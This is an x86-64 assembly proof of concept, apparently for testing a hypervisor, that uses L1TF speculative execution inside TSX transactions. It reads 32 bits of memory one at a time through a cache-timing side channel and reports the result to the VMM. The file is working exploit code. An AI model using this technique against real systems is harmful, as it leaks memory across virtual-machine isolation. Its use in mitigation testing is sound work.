; SPDX-License-Identifier: GPL-2.0
; Copyright 2019 Amazon.com, Inc. or its affiliates.
;
; Author:
;   Julian Stecklina <jsteckli@amazon.de>

BITS 64
ORG 0

	; If memory accesses are faster than this number of cycles, we consider
	; them cache hits. Works for Broadwell.
	;
	; Usage: touch mem-location
	; Clobbers: RFLAGS
%define MAX_CACHE_LATENCY 0xb0

	; Touch a memory location without changing it. It ensures that A/D bits
	; are set in both the guest page table and also in the EPT.
%macro touch 1
	lock add %1, 0
%endmacro

	; Measure the latency of accessing a specific memory location.
	;
	; Usage: measure output-reg, mem-location
	; Clobbers: RAX, RDX, RCX, RFLAGS
%macro measure 2
	lfence
	rdtscp
	lfence

	mov %1, eax
	mov eax, %2

	lfence
	rdtscp
	lfence

	sub %1, eax
	neg %1
%endmacro


SECTION text
	; We enter here in 64-bit long mode with 1:1 paging in the low 1 GiB and
	; a L1TF-prepared page table entry for the location in [RDI].
entry:
	; Set A/D bits for our page table's EPT entries and target addresses. We
	; have 4 page table frames to touch.
	mov rbx, cr3

	touch dword [rbx]
	touch dword [rbx + 0x1000]
	touch dword [rbx + 0x2000]
	touch dword [rbx + 0x3000]

	mov dword [rel target0], 0
	mov dword [rel target1], 0

	; On VM entry, KVM might have cleared the L1D. Give the other thread a
	; chance to run to repopulate it.
	mov ecx, 1000
slack_off:
	pause
	loop slack_off

	; R8 keeps the current bit to test at [RDI]. R9 is where we reconstruct
	; the value of the speculatively read [RDI]. R11 is the "sureness" bitmask.
	xor r8d, r8d
	xor r9d, r9d
	xor r11d, r11d

next_bit:
	mov ecx, r8d

	lea rbx, [target0]
	lea r10, [target1]

	clflush [rbx]
	clflush [r10]

	mfence
	lfence

	; Speculatively read [RDI] at bit RCX/R9 and touch either target0 or
	; target1 depending on the content.
	xbegin abort
	bt [rdi], rcx
	cmovc rbx, r10
	lock inc dword [rbx]
waitl:
	; Pause always aborts the transaction.
	pause
	jmp waitl
abort:

	measure esi, [rbx]
	cmp esi, MAX_CACHE_LATENCY
	mov esi, 0
	setb sil		; SIL -> Was target0 access cached?

	measure ebx, [r10]
	cmp ebx, MAX_CACHE_LATENCY
	mov ebx, 0
	setb bl			; BL -> Was target1 access cached?

	; Remember the read bit in R9.
	mov ecx, r8d
	mov eax, ebx
	shl eax, cl
	or r9d, eax

	shl ebx, 1
	or esi, ebx

	; ESI is now 0b10 if we read a sure 1 bit and 0b01 if we read a sure 0
	; bit. The 0b01 case doesn't work well, unfortunately.
	xor eax, eax
	xor edx, edx
	cmp esi, 0b10
	sete al
	cmp esi, 0b01
	sete dl
	or eax, edx
	shl eax, cl
	or r11d, eax

	; Continue with the remaining bits.
	inc r8d
	cmp r8d, 32
	jb next_bit

	; Tell the VMM about the value that we read. The values are in R9 and
	; R11.
	xor eax, eax
	out 0, eax

	; We should never return after the OUT
	ud2

	; Use initialized data so our .bin file has the correct size
SECTION .data

ALIGN 4096
target0: times 4096 db 0
target1: times 4096 db 0
